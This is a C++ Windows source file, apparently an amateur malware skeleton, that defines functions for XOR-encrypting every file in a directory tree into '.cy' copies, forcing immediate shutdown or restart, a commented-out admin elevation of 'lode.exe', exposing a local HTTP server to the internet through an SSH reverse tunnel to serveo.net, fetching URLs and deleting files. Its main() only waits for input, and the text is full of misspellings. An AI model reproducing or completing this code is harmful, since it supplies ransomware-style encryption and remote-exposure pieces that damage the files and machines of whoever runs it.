#include<iostream>
#include<curl/curl.h>
#include<fstream>
#include<windows.h>
#include <cstdlib>
#include <filesystem>
namespace fs = std::filesystem;
using namespace std;
void get(const string& url){
    CURL* curl=curl_easy_init();
    if(!curl){
        cout<<"dot conect"<<endl;
    }
    curl_easy_setopt(curl,CURLOPT_URL,url.c_str());
    curl_easy_setopt(curl,CURLOPT_NOBODY,1L);
    curl_easy_setopt(curl,CURLOPT_TIMEOUT,10L);
    CURLcode res=curl_easy_perform(curl);
    if(res == CURLE_OK){
        cout<<"conect corect"<<endl;
    }else{
        cout<<"disconect"<<curl_easy_strerror (res)<<endl;
    }
   curl_easy_cleanup(curl);
}
void  file(string filex,string na){

    ofstream openf(filex);
    if(openf.is_open()){
        openf<< na <<endl;
        openf.close();
        cout<<"crearet  file"<<filex<<endl;
    }
}
string carpto(const string& input,int key){
    string out=input;
    for(size_t i=0 ; i<input.size() ; i++){
        out[i]=input[i]^key;

    }
    return out;
}
void encryptFile(const string& inputFile, const string& outputFile, int key){
    ifstream inFile(inputFile, ios::binary); 
    if (!inFile) {
        cerr << "Erore file." << endl;
        return;
    }
    ofstream outFile(outputFile, ios::binary);  
    if (!outFile) {
        cerr << "Error opening output file." << endl;
        return;
    }
    char byte;
    while (inFile.get(byte)) {  
        byte = byte ^ key; 
        outFile.put(byte);  
    }
    inFile.close();  
    outFile.close();

}
void dncryptFile(const string& inputFile, const string& outputFile, int key){
    encryptFile(inputFile,outputFile,key);
}
void encryptFolder(const fs::path& folderPath, int key) {
    if (!fs::exists(folderPath) || !fs::is_directory(folderPath)) {
        cerr << "eroro file encrpto " << endl;
        return;
    }

    for (const auto& entry : fs::recursive_directory_iterator(folderPath)) {
        if (fs::is_regular_file(entry)) {
            fs::path inputPath = entry.path();
            fs::path outputPath = inputPath;
            outputPath += ".cy"; 

            encryptFile(inputPath.string(), outputPath.string(), key);
            cout << "corect file carpto  " << inputPath << " -> " << outputPath << endl;
        }
    }
}
void shutdown(){
    system("shutdown /s /t 0");
}
void restart(){
    system("shutdown /r /t 0");
}
void admin(){
    //ShellExecute(NULL,"runas","lode.exe",NULL,NULL,SW_SHOWNORMAL);
}
void server(){
  system("start cmd /k python -m http.server 8000");
  system("ssh -R web:80:localhost:8000 serveo.net");
}
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}
string fetch(const string& url){
    CURL* curl;
    CURLcode res;
    std::string readBuffer;
    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        if(res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
            return "";
        }
    }
    return readBuffer;

}
void deletf(const wstring& name){
    if(DeleteFileW(name.c_str())){
        wcout<<"dlete file"<<endl;
    }else{
        wcerr << L"Error deleting file. Error code: " << GetLastError() << std::endl;
    }
}
int main(){
   cout<<"enter.."<<endl;
   cin.get();
    return 0;
}